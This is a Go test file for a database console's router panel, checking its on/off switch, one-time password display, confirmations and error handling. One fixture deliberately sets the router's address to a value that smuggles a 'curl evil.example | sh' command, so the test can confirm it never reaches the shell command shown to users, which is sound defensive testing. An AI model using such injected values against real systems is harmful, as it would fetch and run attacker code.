package console

import (
	"encoding/json"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

// TestRouterPanelSwitch runs the whole MCP Server page against a stand-in
// for the two routes that hold the router's switch, and presses the panel's
// own buttons: what is asked of the server, what the panel then says, and
// that the password is on the screen once and stays there until it is
// replaced or the router is turned off.
func TestRouterPanelSwitch(t *testing.T) {
	node, err := exec.LookPath("node")
	if err != nil {
		if os.Getenv(requireNodeEnv) != "" {
			t.Fatalf("%s is set and node is not on PATH", requireNodeEnv)
		}
		t.Skip("node is not installed")
	}
	appJS, err := filepath.Abs("assets/app.js")
	if err != nil {
		t.Fatal(err)
	}
	// The answers are the server's own types, encoded as the server does.
	enc := func(v any) string {
		b, err := json.Marshal(v)
		if err != nil {
			t.Fatal(err)
		}
		return string(b)
	}
	off := routerViewDTO{Access: &routerAccessDTO{CanManage: true}}
	offHadPassword := routerViewDTO{Access: &routerAccessDTO{CanManage: true, HasPassword: true, PasswordCreatedAt: "2026-10-11T14:00:00Z"}}
	on := routerViewDTO{Access: &routerAccessDTO{CanManage: true, Enabled: true, HasPassword: true, PasswordCreatedAt: "2026-10-11T14:00:00Z"}}
	numbers := on
	numbers.Configured, numbers.URL, numbers.ReadAt = true, "http://router:9091/status", "2026-10-11T14:31:00Z"
	numbers.Status = &RouterStatusDoc{Version: 1, Listen: "0.0.0.0:3399", ReadOnly: true, CostThreshold: 10000,
		RouterNumbers: RouterNumbers{Servers: map[string]RouterServerNumbers{"a": {MySQL: 9, Copy: 4, Reasons: map[string]uint64{}}}}}
	// A router's answer is another process's word: what it says its
	// address is must not reach the command people paste into a shell.
	hostile := numbers
	hostileDoc := *numbers.Status
	hostileDoc.Listen = "0.0.0.0:3310; curl evil.example | sh #"
	hostile.Status = &hostileDoc
	odd := numbers
	oddDoc := *numbers.Status
	oddDoc.Listen = "0.0.0.0:99999"
	odd.Status = &oddDoc
	token := routerViewDTO{Access: &routerAccessDTO{Token: true, Refusal: "DBTrail was started with an access token"}}
	refused := routerViewDTO{Access: &routerAccessDTO{Refusal: "the router's settings file could not be read, so it is not changed: yaml: line 1"}}

	script := renderHarnessJS + `
const screen = new FakeEl("main");
document.getElementById = (id) => (id === "view" ? screen : new FakeEl("div"));
const flat = (n, out = []) => { if (n == null) return out; if (typeof n === "string") { out.push(n); return out; }
  if (n.nodeType === 3) { out.push(n.textContent); return out; } if (n._text) out.push(n._text); for (const c of n.children || []) flat(c, out); return out; };
const V = { off: ` + enc(off) + `, offHad: ` + enc(offHadPassword) + `, on: ` + enc(on) + `, numbers: ` + enc(numbers) + `, token: ` + enc(token) + `, refused: ` + enc(refused) + `, hostile: ` + enc(hostile) + `, odd: ` + enc(odd) + ` };
const servers = [{ id: "a", name: "shop", kind: "registry" }];
let router = null, sent = [], change = null, toasts = [], confirms = [], sayYes = true;
ctx.__api = async (path, o) => {
  if (o && o.method && o.method !== "GET") {
    sent.push(o.method + " " + path + " " + JSON.stringify(o.body));
    if (change instanceof Error) throw change;
    return change;
  }
  if (path === "/api/servers") return { servers };
  if (path === "/api/router") { if (router instanceof Error) throw router; return router; }
  return {};
};
ctx.__toast = (m) => toasts.push(String(m));
ctx.confirm = (q) => { confirms.push(q); return sayYes; };
vm.runInContext("api = (p, o) => __api(p, o); gateCapabilities = async () => {}; toastError = (m) => __toast(m); toast = () => {}; icon = () => el('span', {});", ctx);
const find = (n, pred) => { if (!n || typeof n === "string") return null; if (pred(n)) return n;
  for (const c of n.children || []) { const f = find(c, pred); if (f) return f; } return null; };
const panel = () => find(screen, (n) => n.tag === "section" && String((n.attrs && n.attrs.class) || n.className || "").includes("cn-router"));
const see = () => {
  const p = panel();
  if (!p) return { text: "<no router panel>", buttons: [] };
  const buttons = [];
  (function walk(n) { if (!n || typeof n === "string") return; if (n.tag === "button") buttons.push(flat(n).join("") + (n.disabled ? " (disabled)" : "")); for (const c of n.children || []) walk(c); })(p);
  return { text: flat(p).join(" ").replace(/\s+/g, " "), buttons };
};
// open is a page opened anew (nothing held from before); redraw is the same
// page drawn again, as picking another server does.
const redraw = async (view, perms = {}, cur = "a") => {
  router = view; sent = []; toasts = []; confirms = []; sayYes = true; change = null;
  vm.runInContext("currentServer = " + JSON.stringify(cur) + "; capsCache = " + JSON.stringify({ monitor: true, permissions: perms }) + "; capsKnown = true;", ctx);
  await vm.runInContext("renderConnect()", ctx);
};
const open = async (view, perms = {}, cur = "a") => {
  vm.runInContext('routerPasswordOnce = ""', ctx);
  router = view; sent = []; toasts = []; confirms = []; sayYes = true; change = null;
  vm.runInContext("currentServer = " + JSON.stringify(cur) + "; capsCache = " + JSON.stringify({ monitor: true, permissions: perms }) + "; capsKnown = true;", ctx);
  await vm.runInContext("renderConnect()", ctx);
};
const press = async (label, answer, yes = true) => {
  const b = find(panel(), (n) => n.tag === "button" && flat(n).join("") === label);
  if (!b) return false;
  change = answer; sayYes = yes; router = answer instanceof Error ? router : (answer || router);
  b.onclick();
  await new Promise((r) => setImmediate(r));
  return true;
};
const withPw = (v, pw) => Object.assign(JSON.parse(JSON.stringify(v)), { password: pw });
(async () => {
  const out = {};
  await open(V.off); out.off = see();
  out.pressedOn = await press("Turn on", withPw(V.on, "brp_first"));
  out.on = Object.assign(see(), { sent: sent.slice(), confirms: confirms.slice() });

  // Declined: nothing is sent and the screen is as it was.
  sent = [];
  await press("New password", withPw(V.on, "brp_never"), false);
  await press("Turn off", V.offHad, false);
  out.declined = Object.assign(see(), { sent: sent.slice(), confirms: confirms.slice() });

  sent = [];
  out.pressedNew = await press("New password", withPw(V.on, "brp_second"));
  out.replaced = Object.assign(see(), { sent: sent.slice() });

  // A change the server refuses: said, the button usable again, nothing lost.
  sent = [];
  await press("Turn off", Object.assign(new Error("the router's setting could not be saved, so nothing changed: disk full"), { status: 500 }));
  out.failedChange = Object.assign(see(), { sent: sent.slice(), toasts: toasts.slice() });

  // The whole page drawn again: the password is still the only copy.
  await redraw(V.on, {}, "");
  out.redrawn = see();
  await redraw(V.on);

  sent = [];
  out.pressedOff = await press("Turn off", V.offHad);
  out.turnedOff = Object.assign(see(), { sent: sent.slice() });

  // Someone who opens the page later has only what the server stored.
  await open(V.on); out.later = see();
  await open(V.on, {}, ""); out.noServer = see();
  await open(V.numbers); out.numbers = see();
  // With numbers there is a Refresh, and it must not take a password just
  // shown off the screen, whether it works or fails.
  await open(Object.assign(JSON.parse(JSON.stringify(V.numbers)), { access: V.off.access }));
  await press("Turn on", withPw(V.numbers, "brp_kept"));
  await press("Refresh", null);
  out.refreshed = see();
  router = Object.assign(new Error("boom"), { status: 500 });
  await press("Refresh", null);
  out.refreshFailed = see();

  await open(V.hostile); out.hostile = see();
  await open(V.odd); out.odd = see();
  // What the router says of its own start wins over this DBTrail's.
  const says = (view, cred) => { const v = JSON.parse(JSON.stringify(view)); v.status.credential = cred; return v; };
  await open(says(V.numbers, "token")); out.routerHasToken = see();
  await open(Object.assign(says(V.numbers, "saved"), { access: V.token.access })); out.routerHasNoToken = see();
  await open(says(V.numbers, "saved")); out.routerSaved = see();
  // Turned off somewhere else while its password was on this screen.
  await open(V.off); await press("Turn on", withPw(V.on, "brp_gone")); await redraw(V.offHad); out.offElsewhere = see();
  await open(V.token); out.token = see();
  await open(V.refused); out.refused = see();
  await open(V.on, { "settings:write": false }); out.readOnly = see();
  await open({ configured: false }); out.none = see();
  console.log(JSON.stringify(out));
})().catch((e) => console.log(JSON.stringify({ err: String((e && e.stack) || e) })));
`
	path := filepath.Join(t.TempDir(), "router_switch.js")
	if err := os.WriteFile(path, []byte(script), 0o644); err != nil {
		t.Fatal(err)
	}
	raw, err := exec.Command(node, path, appJS).CombinedOutput()
	if err != nil {
		t.Fatalf("node: %v\n%s", err, raw)
	}
	type seen struct {
		Text                            string
		Buttons, Sent, Confirms, Toasts []string
	}
	var got struct {
		Err                                                    string
		PressedOn, PressedNew, PressedOff                      bool
		Off, On, Declined, Replaced, FailedChange, TurnedOff   seen
		Later, NoServer, Numbers, Refreshed, RefreshFailed     seen
		Redrawn, RouterHasToken, RouterHasNoToken, RouterSaved seen
		OffElsewhere                                           seen
		Hostile, Odd                                           seen
		Token, Refused, ReadOnly, None                         seen
	}
	if err := json.Unmarshal(raw, &got); err != nil {
		t.Fatalf("decode %.600q: %v", raw, err)
	}
	if got.Err != "" {
		t.Fatal(got.Err)
	}
	has := func(name string, s seen, wants ...string) {
		t.Helper()
		for _, w := range wants {
			if !strings.Contains(s.Text, w) {
				t.Errorf("%s: want %q in: %s", name, w, s.Text)
			}
		}
	}
	hasNot := func(name string, s seen, nots ...string) {
		t.Helper()
		for _, w := range nots {
			if strings.Contains(s.Text, w) {
				t.Errorf("%s: must not say %q: %s", name, w, s.Text)
			}
		}
	}
	buttons := func(name string, s seen, want string) {
		t.Helper()
		if strings.Join(s.Buttons, ", ") != want {
			t.Errorf("%s: buttons %q, want %q", name, strings.Join(s.Buttons, ", "), want)
		}
	}
	sent := func(name string, s seen, want string) {
		t.Helper()
		if strings.Join(s.Sent, " | ") != want {
			t.Errorf("%s: asked of the server %q, want %q", name, strings.Join(s.Sent, " | "), want)
		}
	}

	has("off", got.Off, "The router is off.", "Turning it on creates its password, shown once.", "is not given the router's address", "second MySQL port for applications")
	hasNot("off", got.Off, "mysql -h", "brp_")
	buttons("off", got.Off, "Turn on")

	if !got.PressedOn || !got.PressedNew || !got.PressedOff {
		t.Fatalf("a button was not there to press: on %v, new password %v, off %v", got.PressedOn, got.PressedNew, got.PressedOff)
	}
	sent("Turn on", got.On, `PUT /api/router {"enabled":true}`)
	has("Turn on", got.On, "The router is on.", "shown only now", "brp_first", "mysql -h 127.0.0.1 -P 3310 -u shop -p", "the MySQL port above has others")
	hasNot("Turn on", got.On, "It cannot be shown again")
	buttons("Turn on", got.On, "Copy, Copy, New password, Turn off")
	if len(got.On.Confirms) != 0 {
		t.Errorf("Turn on asked for confirmation: %q", got.On.Confirms)
	}

	sent("declined", got.Declined, "")
	has("declined", got.Declined, "brp_first")
	if len(got.Declined.Confirms) != 2 || !strings.Contains(got.Declined.Confirms[0], "Every application connected to the router is disconnected") ||
		!strings.Contains(got.Declined.Confirms[1], "Every application connected to the router is disconnected") {
		t.Errorf("both changes that disconnect applications must say so before they are made: %q", got.Declined.Confirms)
	}

	sent("New password", got.Replaced, `POST /api/router/password {}`)
	has("New password", got.Replaced, "brp_second")
	hasNot("New password", got.Replaced, "brp_first")

	sent("a change the server refused", got.FailedChange, `PUT /api/router {"enabled":false}`)
	has("a change the server refused", got.FailedChange, "The router is on.", "brp_second")
	buttons("a change the server refused", got.FailedChange, "Copy, Copy, New password, Turn off")
	if len(got.FailedChange.Toasts) != 1 || !strings.Contains(got.FailedChange.Toasts[0], "disk full") {
		t.Errorf("a change the server refused must be said with its reason: %q", got.FailedChange.Toasts)
	}

	has("the page drawn again", got.Redrawn, "brp_second", "-u <server-name> -p")
	hasNot("the page drawn again", got.Redrawn, "It cannot be shown again")

	has("a router that says it took a token", got.RouterHasToken, "The router that answered was started with an access token.", "9 by MySQL")
	hasNot("a router that says it took a token", got.RouterHasToken, "The router is on.", "mysql -h")
	buttons("a router that says it took a token", got.RouterHasToken, "Refresh")
	has("a token here and a router without it", got.RouterHasNoToken, "The router that answered was started without that token.")
	buttons("a token here and a router without it", got.RouterHasNoToken, "Refresh")
	has("a router that follows the saved setting", got.RouterSaved, "The router is on.")
	buttons("a router that follows the saved setting", got.RouterSaved, "Copy, New password, Turn off, Refresh")
	has("turned off somewhere else", got.OffElsewhere, "The router is off.")
	hasNot("turned off somewhere else", got.OffElsewhere, "brp_")

	sent("Turn off", got.TurnedOff, `PUT /api/router {"enabled":false}`)
	has("Turn off", got.TurnedOff, "The router is off.", "brings back the password it had")
	hasNot("Turn off", got.TurnedOff, "brp_", "mysql -h")
	buttons("Turn off", got.TurnedOff, "Turn on")

	has("opened later", got.Later, "The router is on.", "It cannot be shown again.", "mysql -h 127.0.0.1 -P 3310 -u shop -p", "port 3310, the router's unless it was started with another")
	hasNot("opened later", got.Later, "brp_", "shown only now")
	has("no server picked", got.NoServer, "-u <server-name> -p")

	has("with the router's numbers", got.Numbers, "mysql -h 127.0.0.1 -P 3399 -u shop -p", "9 by MySQL, 4 by the copy")
	hasNot("with the router's numbers", got.Numbers, "is not given the router's address", "port 3310", "second MySQL port for applications")
	buttons("with the router's numbers", got.Numbers, "Copy, New password, Turn off, Refresh")

	has("Refresh after a password was shown", got.Refreshed, "brp_kept", "9 by MySQL")
	has("a failed Refresh after a password was shown", got.RefreshFailed, "brp_kept", "could not ask this DBTrail", "Copy the password above first")
	hasNot("a failed Refresh", got.RefreshFailed, "9 by MySQL")

	for name, s := range map[string]seen{"an address that carries a command": got.Hostile, "a port that is no port": got.Odd} {
		has(name, s, "mysql -h 127.0.0.1 -P 3310 -u shop -p", "port 3310, the router's unless it was started with another")
		if strings.Contains(s.Text, "curl") && strings.Contains(s.Text, "mysql -h 127.0.0.1 -P 3310; curl") || strings.Contains(s.Text, "-P 99999") {
			t.Errorf("%s reached the command to paste: %s", name, s.Text)
		}
	}
	has("started with a token", got.Token, "started with an access token", "with the token as its password")
	hasNot("started with a token", got.Token, "is not given the router's address")
	buttons("started with a token", got.Token, "")
	has("a setting that cannot be changed", got.Refused, "cannot be changed here:", "could not be read")
	buttons("a setting that cannot be changed", got.Refused, "")
	has("no settings:write", got.ReadOnly, "The router is on.")
	buttons("no settings:write", got.ReadOnly, "Copy")
	if got.None.Text != "<no router panel>" {
		t.Errorf("a console with no switch and no address drew a router panel: %s", got.None.Text)
	}
}
